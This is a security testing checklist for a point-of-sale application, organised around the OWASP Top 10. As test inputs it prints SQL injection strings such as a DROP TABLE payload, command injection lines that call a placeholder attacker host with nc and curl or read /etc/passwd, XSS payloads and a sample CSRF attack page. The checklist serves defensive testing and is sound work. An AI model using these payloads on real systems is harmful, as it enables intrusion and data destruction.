# Aether POS - Security Testing Checklist

## OWASP Top 10 Verification (2021)

### 1. Broken Access Control
- [ ] Verify user can only access own data
- [ ] Verify role-based access control (RBAC) works
  - [ ] Admin can access all resources
  - [ ] Manager can access store level only
  - [ ] Cashier can access POS only
  - [ ] Customer cannot access admin panel
- [ ] Test horizontal privilege escalation
  - [ ] User A cannot view User B's transactions
  - [ ] Changing user ID in request fails
- [ ] Test vertical privilege escalation
  - [ ] Cashier cannot access admin functions
  - [ ] Unauthorized endpoints return 403

**Test Cases**:
```
POST /api/users/1/profile
- Change ID to another user → Should fail
- Missing auth token → Should fail
- Expired token → Should fail
```

### 2. Cryptographic Failures

- [ ] Sensitive data encrypted at rest
  - [ ] Passwords: bcrypt with salt
  - [ ] API Keys: encrypted in database
  - [ ] Customer PII: encrypted
  - [ ] Payment data: tokenized (not stored plaintext)
- [ ] Encrypted in transit (TLS)
  - [ ] All HTTPS (no HTTP)
  - [ ] HSTS header present
  - [ ] TLS 1.2+ required
- [ ] No sensitive data in logs
  - [ ] No passwords logged
  - [ ] No API keys logged
  - [ ] No tokens logged
  - [ ] No customer data logged

**Test Commands**:
```bash
# Check HTTPS enforcement
curl -I https://your-domain.com
# Should include: Strict-Transport-Security header

# Check password hashing
SELECT password FROM users WHERE email='test@test.com';
# Should be bcrypt hash, not plaintext

# Check logs
grep -i "password\|token\|key" logs/*.log
# Should return nothing
```

### 3. Injection

**SQL Injection**:
- [ ] Test input field with SQL injection payloads
  - [ ] `' OR '1'='1`
  - [ ] `'; DROP TABLE users; --`
  - [ ] `UNION SELECT * FROM passwords`
  - [ ] Time-based: `' OR SLEEP(5) --`
- [ ] Verify parameterized queries used
- [ ] Test all user inputs (form fields, API params)

**Command Injection**:
- [ ] Test with shell metacharacters
  - [ ] `; cat /etc/passwd`
  - [ ] `| nc attacker.com 1234`
  - [ ] `$(curl attacker.com)`
- [ ] Verify using exec() safely or not at all

**Test Using SQLMAP**:
```bash
# Detect SQL injection vulnerabilities
sqlmap -u "http://localhost:4000/products?page=1" --dbs
sqlmap -u "http://localhost:4000/api/sales" -X POST --data="amount=1&tax=1" --tables
```

### 4. Insecure Design / Broken Authentication

- [ ] Password requirements enforced
  - [ ] Minimum 8 characters
  - [ ] Uppercase, lowercase, number, special char
  - [ ] No reuse of last 5 passwords
- [ ] Account lockout after 5 failed attempts
- [ ] Token expiration
  - [ ] Access token: 15 minutes
  - [ ] Refresh token: 7 days
  - [ ] No infinite session lifespans
- [ ] Session invalidation on logout
- [ ] CSRF tokens on state-changing operations
- [ ] No credential exposure in URL
  - [ ] No ?password= in URL
  - [ ] No tokens in URL (use headers/cookies)
- [ ] No hardcoded credentials
- [ ] No default credentials (admin/admin)

**Test Cases**:
```
1. Weak Password Test
   POST /register
   {"email": "test@test.com", "password": "abc"}
   → Should reject (too weak)

2. Account Lockout Test
   5x POST /login with wrong password
   → Account locked, 6th attempt blocked

3. Token Test
   - Get access token
   - Wait 15 minutes
   - Use token → Should be rejected
   - Use refresh token → Should get new access token

4. Session Fixation Test
   - Get session from browser A
   - Use session in browser B
   → Should fail (session tied to IP/userAgent)
```

### 5. Security Misconfiguration

- [ ] Debug mode disabled in production
- [ ] Error messages don't expose internals
  - [ ] No stack traces to users
  - [ ] No database error details
  - [ ] Generic error messages ("Invalid input")
- [ ] Security headers present
  - [ ] X-Frame-Options: DENY
  - [ ] X-Content-Type-Options: nosniff
  - [ ] Content-Security-Policy header
  - [ ] X-XSS-Protection header
- [ ] Default pages removed
- [ ] Unnecessary services disabled
- [ ] File permissions correct
- [ ] Services use strong defaults

**Check Headers**:
```bash
curl -I https://your-domain.com
# Should include security headers:
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Strict-Transport-Security: max-age=31536000
# Content-Security-Policy: default-src 'self'
```

### 6. Vulnerable and Outdated Components

- [ ] npm audit passes (no critical vulnerabilities)
  ```bash
  npm audit
  npm audit --fix
  # Should fix all vulnerabilities
  ```
- [ ] Dependencies updated regularly
- [ ] Security patches applied within 24 hours
- [ ] No abandoned packages
  ```bash
  npm outdated
  npm update
  ```
- [ ] Docker image scan passed
  ```bash
  docker scan aether-pos:latest
  trivy image aether-pos:latest
  ```
- [ ] SBOM (Software Bill of Materials) available

### 7. Authentication and Session Management

- [ ] Password reset flow secure
  - [ ] Token expires after 1 hour
  - [ ] Token single-use
  - [ ] Emailed to registered email only
  - [ ] No user enumeration
- [ ] Multi-factor authentication available
- [ ] Session management secure
  - [ ] Tokens not predictable
  - [ ] Tokens have sufficient entropy (256+ bits)
  - [ ] Tokens signed/encrypted
  - [ ] Expired sessions properly invalidated

**Test Token Entropy**:
```javascript
// Generate 100 tokens, analyze randomness
const tokens = [];
for (let i = 0; i < 100; i++) {
  tokens.push(await generateToken());
}
// Use entropy analyzer to verify >256 bits
```

### 8. Software and Data Integrity Failures

- [ ] Updates downloaded from trusted sources
- [ ] Downloads verified with signatures
  ```bash
  # Verify checksums
  sha256sum file.zip
  # Compare with official source
  ```
- [ ] CI/CD pipeline signed
- [ ] No automatic updates from untrusted sources
- [ ] Integrity checks on database modifications

### 9. Logging and Monitoring Failures

- [ ] Security events logged
  - [ ] Failed login attempts
  - [ ] Permission changes
  - [ ] Admin actions
  - [ ] Data exports
  - [ ] Configuration changes
- [ ] Logs include sufficient detail
  - [ ] Timestamp
  - [ ] User ID
  - [ ] Action
  - [ ] Result (success/failure)
  - [ ] IP address
- [ ] Logs protected from tampering
  - [ ] Append-only storage
  - [ ] Signed/encrypted
  - [ ] Centralized logging
  - [ ] Retention >90 days
- [ ] Monitoring alerts on suspicious activity
  - [ ] Multiple failed login attempts
  - [ ] Bulk data access
  - [ ] Permission changes
  - [ ] System errors

**Example Log Entry**:
```json
{
  "timestamp": "2024-03-04T14:23:56Z",
  "eventType": "UNAUTHORIZED_ACCESS_ATTEMPT",
  "userId": "unknown",
  "detail": "Failed to access /admin - user insufficient permissions",
  "resource": "/admin/users",
  "ipAddress": "192.168.1.100",
  "userAgent": "Mozilla/5.0..."
}
```

### 10. Server-Side Request Forgery (SSRF)

- [ ] No arbitrary URL requests
- [ ] URLs controlled by admin only
- [ ] Validate internal/private IP blocks
  - [ ] Reject 127.0.0.1
  - [ ] Reject 192.168.x.x
  - [ ] Reject 172.16-31.x.x
  - [ ] Reject 10.x.x.x
- [ ] No DNS rebinding possible

## Additional Security Tests

### Cross-Site Scripting (XSS)

#### Stored XSS
- [ ] Test user input fields
  - Product name: `<script>alert('XSS')</script>`
  - Customer notes: `<img src=x onerror=alert('XSS')>`
  - Report title: `"><svg onload=alert('XSS')>`
- [ ] Verify stored & displayed safely
- [ ] Use HTML encoding/sanitization

#### Reflected XSS
- [ ] URL parameters: `?search=<script>alert('XSS')</script>`
- [ ] Query strings: `/search?q="><svg onload=alert('XSS')>`
- [ ] Verify encoded in response

#### DOM-based XSS
- [ ] JavaScript accessing `window.location.hash`
- [ ] Direct DOM manipulation: `document.innerHTML = userInput`
- [ ] Test with: `#<img src=x onerror=alert('XSS')>`

### Cross-Site Request Forgery (CSRF)

- [ ] State-changing requests (POST, PUT, DELETE) require CSRF token
- [ ] Token validated server-side
- [ ] Token unique per session
- [ ] SameSite cookie attribute set
  ```
  Set-Cookie: session=abc123; SameSite=Strict
  ```

**Test CSRF**:
```html
<!-- Attacker page -->
<form action="https://yoursite.com/api/save-settings" method="POST">
  <input name="setting" value="evil_value">
</form>
<script>document.querySelector('form').submit();</script>

<!-- Should fail because no CSRF token -->
```

### Rate Limiting / Brute Force Protection

- [ ] Rate limit on login (max 5 attempts/15 min)
- [ ] Rate limit on API endpoints (100 req/min per user)
- [ ] Rate limit on password reset (3 requests/hour)
- [ ] Progressive delays after failures
  - 1st fail: immediate
  - 2nd fail: 2 second delay
  - 3rd fail: 5 second delay
  - 4th fail: 15 second delay
  - 5th fail: account locked (30 min)

**Test Rate Limiting**:
```bash
# Rapid requests
for i in {1..10}; do
  curl -X POST http://localhost:4000/api/login \
    -d '{"email":"test","password":"wrong"}' \
  echo "Request $i"
done
# After 5: Should return 429 (Too Many Requests)
```

### JWT Security

- [ ] Tokens signed with strong algorithm (RS256, HS256)
- [ ] No sensitive data in payload (can be decoded)
- [ ] Tokens don't contain passwords/secrets
- [ ] Algorithm not set to "none"
  ```bash
  # Get token, decode, check "alg" field
  jwt decode YOUR_TOKEN
  # Should show: "alg": "HS256" (or RS256)
  # NOT: "alg": "none"
  ```

## Security Scanning Tools

### Automated Security Scanning

```bash
# 1. Dependency Vulnerabilities
npm audit
snyk test --severity=high

# 2. SAST (Static Analysis)
# Check code without running it
npm install -g semgrep
semgrep --config=p/owasp-top-ten . --json

# 3. DAST (Dynamic Analysis)
# Check running application
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:4000 \
  -r baseline-report.html

# 4. Container Scanning
docker build -t aether-pos:test .
trivy image aether-pos:test
grype aether-pos:test

# 5. IaC Scanning (Kubernetes, Docker)
trivy config k8s/

# 6. Secrets Detection
npm install -g detect-secrets
detect-secrets scan --baseline .secrets.baseline
```

## Manual Security Testing Checklist

### Authentication
- [ ] Password requirements enforced
- [ ] Account lockout works (5 failures)
- [ ] Password reset email secure
- [ ] Tokens expire correctly
- [ ] Logout invalidates session
- [ ] Session fixation impossible
- [ ] No hardcoded credentials found

### Authorization
- [ ] Admin access only for admins
- [ ] Manager access only for managers
- [ ] Cashier can't access other roles
- [ ] Users can't view others' data
- [ ] API endpoints check permissions
- [ ] No privilege escalation

### Data Protection
- [ ] Passwords hashed (bcrypt)
- [ ] Sensitive data encrypted
- [ ] No sensitive data in logs
- [ ] No sensitive data in errors
- [ ] API keys not exposed
- [ ] Payment data not stored plaintext

### Input Validation
- [ ] SQL injection tests fail safely
- [ ] XSS payloads encoded
- [ ] Command injection blocked
- [ ] File upload validation
- [ ] Input length limits enforced
- [ ] Special characters handled

### API Security
- [ ] HTTPS only (no HTTP)
- [ ] CORS origin whitelist enforced
- [ ] Content-Type validated
- [ ] CSRF tokens checked
- [ ] Rate limiting works
- [ ] Error messages generic

### Infrastructure
- [ ] Server headers secure
- [ ] Debug mode off
- [ ] Default pages removed
- [ ] Unnecessary services stopped
- [ ] Firewall rules in place
- [ ] Backup encrypted

## Compliance Checklists

### PCI DSS (Payment Card Data)
- [ ] Encrypt cardholder data (using external service)
- [ ] No storage of full PAN/CVV
- [ ] Strong access controls
- [ ] Audit trails maintained
- [ ] Regular security testing
- [ ] Incident response plan

### GDPR (EU Customer Data)
- [ ] Consent collected
- [ ] Privacy policy available
- [ ] Data export functionality
- [ ] Right to deletion
- [ ] Breach notification process
- [ ] Data Protection Impact Assessment (DPIA)

### HIPAA (Health Data - if applicable)
- [ ] Access controls enforced
- [ ] Encryption at rest and transit
- [ ] Audit logging
- [ ] Breach notification
- [ ] Business Associate Agreements
- [ ] Risk assessments

## Security Sign-Off

Before production release:
```
✅ All OWASP Top 10 checks passed
✅ npm audit: no critical vulnerabilities
✅ Snyk: no critical issues
✅ OWASP ZAP: no critical issues
✅ Manual pen testing: all tests passed
✅ Security headers: all present
✅ TLS 1.2+ enforced
✅ No sensitive data in logs
✅ Password security requirements met
✅ Rate limiting functional
✅ CSRF protection enabled
✅ Security testing results documented
✅ Incident response plan ready
✅ Team training completed
✅ Security review approved
```

## Incident Response

### Vulnerability Found in Production
1. Assess severity
2. Isolate affected systems if critical
3. Notify stakeholders
4. Develop fix
5. Apply fix
6. Verify fix
7. Document incident
8. Post-mortem analysis
9. Prevention measures

### Breach Notification
- [ ] Legal team notified
- [ ] Affected users notified (GDPR requirement)
- [ ] Authorities notified if required
- [ ] Timeline documented
- [ ] Damage assessment completed
